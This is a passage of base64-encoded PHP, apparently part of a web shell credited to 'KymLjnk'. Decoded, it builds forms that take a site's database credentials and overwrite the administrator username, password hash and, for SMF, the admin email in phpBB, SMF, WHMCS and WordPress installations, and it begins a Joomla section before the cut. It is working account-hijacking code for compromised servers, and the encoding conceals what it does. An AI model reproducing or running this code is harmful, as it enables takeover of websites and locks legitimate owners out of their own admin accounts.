MDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJwaHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHBhc3N3b3JkIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXBhc3N3b3JkIG5hbWU9cHNwaHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VGFibGUgcHJlZml4PGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cGhwYmJfIHR5cGU9dGV4dCBuYW1lPXBycGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHBocCA9ICRfUE9TVFsnZGJocGhwJ107CiRkYm5waHAgID0gJF9QT1NUWydkYm5waHAnXTsKJGRidXBocCA9ICRfUE9TVFsnZGJ1cGhwJ107CiRkYnBwaHAgID0gJF9QT1NUWydkYnBwaHAnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHBocCwkZGJ1cGhwLCRkYnBwaHApOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5waHApOwoKJHVycGhwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnBocCk7CiRzZXRfdXJwaHAgPSAkX1BPU1RbJ3VycGhwJ107CgokcHNwaHA9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHBzcGhwKTsKJHBhc3NfcGhwID0gJF9QT1NUWydwc3BocCddOwokc2V0X3BzcGhwID0gbWQ1KCRwYXNzX3BocCk7CgokcGhwX3ByZWZpeCA9ICRfUE9TVFsncHJwaHAnXTsKCiR0YWJsZV9uYW1lMiA9ICRwaHBfcHJlZml4LiJ1c2VycyIgOwoKJGxlY29uZ3RoaWVuNSA9ICJVUERBVEUgJHRhYmxlX25hbWUyIFNFVCB1c2VybmFtZV9jbGVhbiA9JyIuJHNldF91cnBocC4iJyBXSEVSRSB1c2VyX2lkID0nMiciOwokbGVjb25ndGhpZW42ID0gIlVQREFURSAkdGFibGVfbmFtZTIgU0VUIHVzZXJfcGFzc3dvcmQgPSciLiRzZXRfcHNwaHAuIicgV0hFUkUgdXNlcl9pZCA9JzInIjsKCiRvazM9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjUpOwokb2szPUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW42KTsKCmlmKCRvazMpewplY2hvICI8c2NyaXB0PmFsZXJ0KCdwaHBCQiB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbmsgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1NNRgppZiAoaXNzZXQoJF9QT1NUWydzbWYnXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIFNNRiBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2luZGV4LnBocD9hY3Rpb249YWRtaW48YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL1NldHRpbmdzLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmhzbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXNtZiB0eXBlPXRleHQgbmFtZT1kYm5zbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1c21mIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHBhc3N3b3JkPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9YWRtaW4gdHlwZT1wYXNzd29yZCBuYW1lPWRicHNtZiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJzbWYgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIEUtbWFpbCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXlvdXItZW1haWxAeHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbXNtZiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5UYWJsZSBwcmVmaXg8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1zbWZfIHR5cGU9dGV4dCBuYW1lPXByc21mIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHNtZiA9ICRfUE9TVFsnZGJoc21mJ107CiRkYm5zbWYgID0gJF9QT1NUWydkYm5zbWYnXTsKJGRidXNtZiA9ICRfUE9TVFsnZGJ1c21mJ107CiRkYnBzbWYgID0gJF9QT1NUWydkYnBzbWYnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHNtZiwkZGJ1c21mLCRkYnBzbWYpOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5zbWYpOwoKJHVyc21mPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnNtZik7CiRzZXRfdXJzbWYgPSAkX1BPU1RbJ3Vyc21mJ107CgokZW1zbWY9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJGVtc21mKTsKJHNldF9lbXNtZiA9ICRfUE9TVFsnZW1zbWYnXTsKCiRzbWZfcHJlZml4ID0gJF9QT1NUWydwcnNtZiddOwoKJHRhYmxlX25hbWUzID0gJHNtZl9wcmVmaXguIm1lbWJlcnMiIDsKCiRsZWNvbmd0aGllbjcgPSAiVVBEQVRFICR0YWJsZV9uYW1lMyBTRVQgbWVtYmVyX25hbWUgPSciLiRzZXRfdXJzbWYuIicgV0hFUkUgaWRfbWVtYmVyID0nMSciOwokbGVjb25ndGhpZW44ID0gIlVQREFURSAkdGFibGVfbmFtZTMgU0VUIGVtYWlsX2FkZHJlc3MgPSciLiRzZXRfZW1zbWYuIicgV0hFUkUgaWRfbWVtYmVyID0nMSciOwoKJGxlY29uZ3RoaWVuNyA9ICJVUERBVEUgJHRhYmxlX25hbWUzIFNFVCBtZW1iZXJOYW1lID0nIi4kc2V0X3Vyc21mLiInIFdIRVJFIElEX01FTUJFUiA9JzEnIjsKJGxlY29uZ3RoaWVuOCA9ICJVUERBVEUgJHRhYmxlX25hbWUzIFNFVCBlbWFpbEFkZHJlc3MgPSciLiRzZXRfZW1zbWYuIicgV0hFUkUgSURfTUVNQkVSID0nMSciOwoKJG9rND1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuNyk7CiRvazQ9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjgpOwoKaWYoJG9rNCl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1NNRiB1cGRhdGUgc3VjY2VzcyAuIFRoYW5rIEt5bUxqbmsgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1dITUNTCmlmIChpc3NldCgkX1BPU1RbJ3dobWNzJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBXSE1DUyBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluPGJyPlBhdGggQ29uZmlnIDogW3BhdGNoXS9jb25maWd1cmF0aW9uLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmh3aG0gc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdobWNzIHR5cGU9dGV4dCBuYW1lPWRibndobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV3aG0gc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwd2htIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSB1c2VyIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXRleHQgbmFtZT11cndobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3dobSBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdDaGFuZ2UnID48L2Zvcm0+PC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+PC9jZW50ZXI+IjsKfWVsc2V7CiRkYmh3aG0gPSAkX1BPU1RbJ2RiaHdobSddOwokZGJud2htICA9ICRfUE9TVFsnZGJud2htJ107CiRkYnV3aG0gPSAkX1BPU1RbJ2RidXdobSddOwokZGJwd2htICA9ICRfUE9TVFsnZGJwd2htJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh3aG0sJGRidXdobSwkZGJwd2htKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJud2htKTsKCiR1cndobT1zdHJfcmVwbGFjZSgiXCciLCInIiwkdXJ3aG0pOwokc2V0X3Vyd2htID0gJF9QT1NUWyd1cndobSddOwoKJHBzd2htPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3dobSk7CiRwYXNzX3dobSA9ICRfUE9TVFsncHN3aG0nXTsKJHNldF9wc3dobSA9IG1kNSgkcGFzc193aG0pOwoKJGxlY29uZ3RoaWVuOSA9ICJVUERBVEUgdGJsYWRtaW5zIFNFVCB1c2VybmFtZSA9JyIuJHNldF91cndobS4iJyBXSEVSRSBpZCA9JzEnIjsKJGxlY29uZ3RoaWVuMTAgPSAiVVBEQVRFIHRibGFkbWlucyBTRVQgcGFzc3dvcmQgPSciLiRzZXRfcHN3aG0uIicgV0hFUkUgaWQgPScxJyI7Cgokb2s1PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW45KTsKJG9rNT1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTApOwoKaWYoJG9rNSl7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1dITUNTIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KCi8vV29yZFByZXNzCmlmIChpc3NldCgkX1BPU1RbJ3dvcmRwcmVzcyddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgV29yZFByZXNzIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vd3AtYWRtaW48YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL3dwLWNvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJod3Agc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdvcmRwcmVzcyB0eXBlPXRleHQgbmFtZT1kYm53cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnB3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJ3cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3dwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXdwXyB0eXBlPXRleHQgbmFtZT1wcndwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHdwID0gJF9QT1NUWydkYmh3cCddOwokZGJud3AgID0gJF9QT1NUWydkYm53cCddOwokZGJ1d3AgPSAkX1BPU1RbJ2RidXdwJ107CiRkYnB3cCAgPSAkX1BPU1RbJ2RicHdwJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh3cCwkZGJ1d3AsJGRicHdwKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJud3ApOwoKJHVyd3A9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVyd3ApOwokc2V0X3Vyd3AgPSAkX1BPU1RbJ3Vyd3AnXTsKCiRwc3dwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3dwKTsKJHBhc3Nfd3AgPSAkX1BPU1RbJ3Bzd3AnXTsKJHNldF9wc3dwID0gbWQ1KCRwYXNzX3dwKTsKCiR3cF9wcmVmaXggPSAkX1BPU1RbJ3Byd3AnXTsKCiR0YWJsZV9uYW1lNCA9ICR3cF9wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4xMSA9ICJVUERBVEUgJHRhYmxlX25hbWU0IFNFVCB1c2VyX2xvZ2luID0nIi4kc2V0X3Vyd3AuIicgV0hFUkUgSUQgPScxJyI7CiRsZWNvbmd0aGllbjEyID0gIlVQREFURSAkdGFibGVfbmFtZTQgU0VUIHVzZXJfcGFzcyA9JyIuJHNldF9wc3dwLiInIFdIRVJFIElEID0nMSciOwoKJG9rNj1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTEpOwokb2s2PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xMik7CgppZigkb2s2KXsKZWNobyAiPHNjcmlwdD5hbGVydCgnV29yZFByZXNzIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KCi8vSm9vbWxhCmlmIChpc3NldCgkX1BPU1RbJ2pvb21sYSddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgSm9vbWxhIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vYWRtaW5pc3RyYXRvcjxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vY29uZmlndXJhdGlvbi5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJoam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1qb29tbGEgdHlwZT10ZXh0IG5hbWU9ZGJuam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHVzZXI8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1yb290IHR5cGU9dGV4dCBuYW1lPWRidWpvcyBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnBqb3Mgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVyam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBwYXNzd29yZCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT1wYXNzd29yZCBuYW1lPXBzam9zIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlP